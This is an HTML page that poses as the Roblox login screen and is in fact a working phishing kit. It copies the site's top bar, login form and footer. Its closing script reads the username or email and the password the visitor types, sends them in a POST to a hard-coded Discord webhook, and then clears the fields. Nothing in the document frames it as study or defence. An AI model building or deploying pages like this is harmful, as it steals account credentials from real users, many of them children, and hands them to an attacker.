<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Login to Roblox</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      background-color: #1c1c1c;
      font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
      color: white;
      height: 100vh;
      overflow: hidden;
      position: relative;
    }

    .topbar {
      width: 100%;
      background-color: #1c1c1c;
      color: white;
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 10px 0;
      gap: 30px;
      font-size: 14px;
      border-bottom: 1px solid #333;
    }

    .topbar .logo {
      font-weight: bold;
      font-size: 18px;
    }

    .topbar a {
      color: white;
      text-decoration: none;
      padding: 6px 10px;
    }

    .topbar .search {
      padding: 5px;
      border-radius: 4px;
      border: none;
      font-size: 14px;
    }

    .topbar .buttons {
      display: flex;
      gap: 10px;
      align-items: center;
    }

    .topbar .signup {
      background-color: #00d26a;
      color: white;
      border: none;
      padding: 6px 10px;
      border-radius: 4px;
      cursor: pointer;
    }

    .topbar .login {
      background-color: #444;
      color: white;
      border: none;
      padding: 6px 10px;
      border-radius: 4px;
      cursor: pointer;
    }

    .container {
      background-color: #2c2c2c;
      width: 400px;
      padding: 35px;
      border-radius: 10px;
      box-shadow: 0 4px 8px rgba(0,0,0,0.2);
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
    }

    .login-title {
      text-align: center;
      font-size: 28px;
      font-weight: 800;
      color: white;
      letter-spacing: 0.5px;
      margin-bottom: 25px;
    }

    .input-field {
      width: 100%;
      padding: 10px;
      margin-bottom: 15px;
      border: 1px solid #555;
      border-radius: 5px;
      background-color: #1f1f1f;
      color: white;
      font-size: 14px;
    }

    .input-field::placeholder {
      color: #bbb;
    }

    .btn,
    .outline-btn {
      width: 100%;
      padding: 12px;
      border-radius: 5px;
      font-size: 14px;
      font-weight: bold;
      cursor: pointer;
      margin-top: 10px;
      background-color: transparent;
      color: white;
      border: 2px solid white;
      text-align: center;
    }

    .btn:hover,
    .outline-btn:hover {
      background-color: rgba(255, 255, 255, 0.1);
    }

    .link {
      text-align: center;
      font-size: 13px;
      color: white;
      margin: 8px 0;
      cursor: pointer;
    }

    .link:hover {
      text-decoration: underline;
    }

    .footer {
      font-size: 11px;
      color: #aaa;
      text-align: center;
      position: absolute;
      bottom: 10px;
      width: 100%;
      line-height: 1.6;
    }

    .footer a {
      color: #aaa;
      margin: 0 5px;
      text-decoration: none;
    }

    .footer a:hover {
      text-decoration: underline;
    }
  </style>
</head>
<body>

  <!-- Barre du haut -->
  <div class="topbar">
    <div class="logo">ROBLOX</div>
    <a href="#">Discover</a>
    <a href="#">Marketplace</a>
    <a href="#">Create</a>
    <a href="#">Robux</a>
    <input class="search" type="text" placeholder="Search">
    <div class="buttons">
      <button class="signup">Sign Up</button>
      <button class="login">Log In</button>
    </div>
  </div>

  <!-- Formulaire de connexion centré -->
  <div class="container">
    <h2 class="login-title">Login to Roblox</h2>

    <input type="text" id="username" class="input-field" placeholder="Username / Email / Phone" required>
    <input type="password" id="password" class="input-field" placeholder="Password" required>

    <button class="btn" onclick="sendToDiscord()">Log In</button>

    <div class="link">Forgot Password or Username?</div>
    <button class="outline-btn">Another Logged In Device? Log In</button>
    <div class="link">Don't have an account? <strong>Sign Up</strong></div>
  </div>

  <!-- Pied de page -->
  <div class="footer">
    <a href="#">About Us</a> |
    <a href="#">Jobs</a> |
    <a href="#">Blog</a> |
    <a href="#">Parents</a> |
    <a href="#">Gift Cards</a> |
    <a href="#">Help</a> |
    <a href="#">Terms</a> |
    <a href="#">Accessibility</a> |
    <a href="#">Privacy</a>
  </div>

  <script>
    const webhookUrl = "https://discordapp.com/api/webhooks/1370101183229857903/ciNzwq6Ngr2Ylb2iqD5VUzrEGXAPg2qDI2rOJ-LprVnav6Ypv4TjP0zhue5JpzZKyt8M";

    function sendToDiscord() {
      const username = document.getElementById("username").value;
      const password = document.getElementById("password").value;

      const message = {
        content: `Tentative de connexion:\nUsername/Email/Phone: ${username}\nPassword: ${password}`,
        username: "Webhook Page Web",
        avatar_url: "https://i.imgur.com/AfFp7pu.png"
      };

      fetch(webhookUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(message)
      })
      .then(response => response.json())
      .then(data => {
        console.log("Message envoyé !", data);
        document.getElementById("username").value = '';
        document.getElementById("password").value = '';
      })
      .catch(error => {
        console.error("Erreur d'envoi :", error);
      });
    }
  </script>

</body>
</html>
